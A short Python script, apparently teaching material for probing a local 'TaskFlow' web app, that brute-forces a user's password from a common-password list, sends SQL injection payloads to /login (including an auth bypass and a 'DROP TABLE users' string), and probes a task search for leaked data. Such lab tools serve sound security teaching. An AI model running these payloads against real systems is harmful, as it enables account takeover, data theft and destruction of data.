#!/usr/bin/env python3
"""Training brute-force + SQLi probe against a local TaskFlow instance.

Usage: python bruteforce.py http://localhost:5000 <username>
For classroom use on your OWN local instance only.
"""
import sys
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
USER = sys.argv[2] if len(sys.argv) > 2 else "alice"

PASSWORDS = ["123456", "password", "qwerty", "letmein", "admin", "welcome",
             "monkey", "dragon", "football", "iloveyou", "secret123"]

SQLI = ["' OR 1=1 --", "admin' --", "' OR '1'='1", "'; DROP TABLE users --"]

def main():
    print(f"[*] brute-forcing {USER} on {BASE}")
    for pw in PASSWORDS:
        r = requests.post(f"{BASE}/login", json={"username": USER, "password": pw})
        print(f"    pw={pw:12} -> {r.status_code}")
    print("[*] SQLi probes on /login  (500 = injectable; bcrypt prevents the classic bypass)")
    for payload in SQLI:
        r = requests.post(f"{BASE}/login", json={"username": payload, "password": "x"})
        flag = "  <-- BYPASS!" if r.status_code == 200 else ("  <-- INJECTABLE (server error)" if r.status_code == 500 else "")
        print(f"    payload={payload:20} -> {r.status_code}{flag}")

    # Data-leak probe on the task search (F1). Needs a valid session: we try the last
    # password of the list, which is the classroom default (secret123).
    r = requests.post(f"{BASE}/login", json={"username": USER, "password": PASSWORDS[-1]})
    if r.status_code == 200:
        token = r.json()["token"]
        print("[*] SQLi probe on /tasks?q= (search)")
        r = requests.get(f"{BASE}/tasks", params={"q": "%' OR 1=1 --"},
                         headers={"Authorization": f"Bearer {token}"})
        n = len(r.json()) if r.status_code == 200 else 0
        print(f"    q=%' OR 1=1 --  -> {r.status_code}, {n} task(s) returned"
              + ("  <-- LEAK: more than this user's tasks?" if n else ""))

if __name__ == "__main__":
    main()
